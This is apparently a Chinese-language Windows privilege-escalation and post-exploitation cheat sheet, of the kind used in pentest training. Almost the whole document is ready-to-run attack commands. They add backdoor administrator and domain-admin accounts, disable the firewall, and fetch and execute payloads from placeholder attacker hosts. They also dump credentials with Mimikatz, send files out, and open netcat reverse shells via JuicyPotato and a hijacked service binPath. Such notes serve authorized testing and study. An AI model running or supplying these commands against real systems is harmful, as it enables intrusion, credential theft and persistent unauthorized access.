
### 常用工具

* https://lolbas-project.github.io/



### 信息收集


```bash
chdir
whomai /priv
query user
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
tasklist /SVC
tree /A /F
ipconfig /all
schtasks /query /fo LIST /v
wmic service get name,displayname,pathname,startmode
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows"
PS> Get-ChildItem -Path C:\Users -Recurse -Include root.txt

dir /r
attrib *.* -h -s /s /d
findstr /si password *.xml *.ini *.txt+
where /R C:\\ proof.txt or where /R C:\\ local.txt

net user
net groups
net user 0x584a 0x584a /add
net localgroup "Remote Desktop Users" "0x584a" /add
net localgroup "Administrators" "0x584a" /add


net users /domain
net groups /domain
net user 0x584a 0x584a /add /domain /y
net group "domain controllers" /domain
net group "domain admins" 0x584a /add

# SPN查询
C:\\Windows\\Temp>setspn -q */*

for /L %i in (1,1,255) do @ping -n 1 -w 200 10.10.10.%i > nul && echo 10.10.10.%i is up.

cmdkey /list

type proof.txt && whoami && hostname && ipconfig
cat proof.txt && whoami && hostname && ip addr


dir /r ---> hm.txt:root.txt:$DATA
more < hm.txt:root.txt

# 显示或修改文件的访问控制列表
icacls or cacls
icacls "C:\path"
```



### 常用服务路径

```bash
c:\\Windows\\Temp
c:\\windows\\system32\\cmd.exe
(64-bit) C:\windows\system32\WindowsPowerShell
(32-bit) C:\windows\SysWOW64\WindowsPowerShell
C:\\Windows\\SysNative\\WindowsPowerShell\\v1.0\\PowerShell.exe
SAM文件的路径是 %SystemRoot%\system32\config\sam
```



### 安全防护配置

```bash
# 查看防火墙状态
netsh firewall show state
# 关闭防火墙
netsh firewall set opmode mode=disable

netsh advfirewall show currentprofile
netsh advfirewall firewall show rule name=all
netsh advfirewall show allprofiles
netsh advfirewall firewall set allprofiles state=off
netsh firewall set opmode disable
```



### 文件传递

```bash
certutil -urlcache -f http://0.0.0.0/shell2.php shell2.php
certutil.exe -urlcache -split -f "http://<ATTACKER-IP>:<PORT>/<file>" exploit.exe

bitsadmin /transfer mydownloadjob /download /priority normal http://<ATTACKER-IP>/xyz.exe C:\\Users\\%USERNAME%\\AppData\\local\\temp\\xyz.exe

cscript wget.vbs <ATTACKER IP>/<FILE> evil.exe

cmd> Python Server Web Service
powershell> Invoke-WebRequest "http://0.0.0.0/winPEASx64.exe" -OutFile "winPEASx64.exe"

# 加载远程脚本模块
powershell> IEX (New-Object Net.WebClient).DownloadString('http://0.0.0.0/Invoke-Kerberoast.ps1')
powershell> IEX (New-Object Net.WebClient).DownloadString('http://0.0.0.0/Invoke-Mimikatz.ps1')
powershell> Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonPasswords full"'
powershell> Invoke-Mimikatz -DumpCreds

# 发送文件
<?php $uploaddir='/var/www/uploads/'; $uploadfile=$uploaddir . $_FILES['file']['name']; move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)?>
powershell> powershell (New-Object System.Net.WebClient).UploadFile('http://<ATTACKER-IP>:<PORT>/upload.php', 'important.docx')

kali> impacket-smbserver share `pwd`
cmd> copy \\<kali ip >\share\nc.exe .\nc.exe

kali> ftp Server
cmd> ftp <IP> --> get --> put

bash> curl --upload-file linpeas.txt http://<IP>:1337/linpeas.txt   <-- PUT 文件传递
```



### powershell

```bash
Invoke-PowerShellTcp.ps1

powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).downloadString('http://<IP>/Shell.ps1')"

cmd> powershell "IEX(New-Object Net.WebClient).downloadString('http://<IP>/s.ps1')"
cmd> powershell -executionpolicy bypass -file s.ps1

cmd> powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<IP>/Invoke-MS16-032.ps1');Invoke-MS16-032 -Application cmd.exe -commandline 'c:\\windows\\temp\\nc.exe -e cmd <IP> 9900'"
```



### RUNAS

```bash
runas /user:<localmachinename>\administrator cmd

$secpasswd = ConvertTo-SecureString "0x584a" -AsPlainText -Force 
$mycreds = New-Object System.Management.Automation.PSCredential ("Administrator",$secpasswd) 
$computer = "computer" 
[System.Diagnostics.Process]::Start("C:\Users\Public\nc.exe","<ATTACKER-IP> <PORT> -e cmd.exe",$mycreds.Username,$mycreds.Password,$computer)
```



### 内核提权枚举、攻击

```bash
https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1
powershell> IEX(New-Object Net.WebClient).DownloadString('http://0.0.0.0/Sherlock.ps1')
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1

# exploit只适应x64框架
https://raw.githubusercontent.com/FuzzySecurity/PSKernel-Primitives/master/Sample-Exploits/MS16-135/MS16-135.ps1

windows-exploit-suggester.py --impact "elevation of privilege" systeminfo.txt
```

### 常用工具

* Invoke-PowerShellTcp.ps1
* PowerUp.ps1 --> Invoke-AllChecks
* Seatbelt.exe
* SharpUp.exe
* winPEAS.exe
* Sherlock
* Windows-Exploit-Suggester




### whoami /priv

> SeImpersonatePrivilege 权限下可用工具进行提权：

```bash
juicy-potato*
RogueWinRm
SweetPotato
PrintSpoofer
```



### juicy potato

https://github.com/ohpe/juicy-potato

```bash
.\JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\Windows\Temp\nc.exe -e cmd.exe <kali ip> 9900" -t *

```

Windows 7 Enterprise
Windows 8.1 Enterprise
Windows 10 Enterprise
Windows 10 Professional
Windows Server 2008 R2 Enterprise
Windows Server 2012 Datacenter
Windows Server 2016 Standard



### Print Spoofer

```bash
.\PrintSpoofer.exe -i -c "whoami"


https://github.com/calebstewart/CVE-2021-1675 cve-2021-1675.ps1
在没用 SeImpersonatePrivilege 权限的场景下提权
```


### 术语解析

>  LM Hash & NTLM Hash https://www.anquanke.com/post/id/193149

windows内部是不保存明文密码的，只保存密码的hash。
其中本机用户的密码hash是放在 本地的SAM文件 里面，域内用户的密码hash是存在域控的NTDS.DIT文件 里面。那hash的格式是怎么样的呢?
在Windows系统导出密码的时候，经常看到这样的密码格式
Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0:::
其中的AAD3B435B51404EEAAD3B435B51404EE是LM Hash
31D6CFE0D16AE931B73C59D7E0C089C0是NTLM Hash

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

https://guif.re/windowseop




## 常用版本提权exploit

### Microsoft Windows Server 2008 R2 Datacenter

MS10_092
ms10-059 Chimichurri
MS15-051

### Microsoft Windows 7 Enterprise

ms10-059 Chimichurri

```
cmd> Chimichurri.exe <IP> 9900
OS Name:                   Microsoft Windows 7 Enterprise
OS Version:                6.1.7600 N/A Build 7600
```

### Windows 10.0 Build 17763 x64

PrintSpoofer

### 常用服务提权

```bash
sc.exe config vss binPath="C:\Users\svc-printer\Downloads\nc.exe -e cmd.exe <IP> 9900"
sc.exe stop vss
sc.exe start vss
```
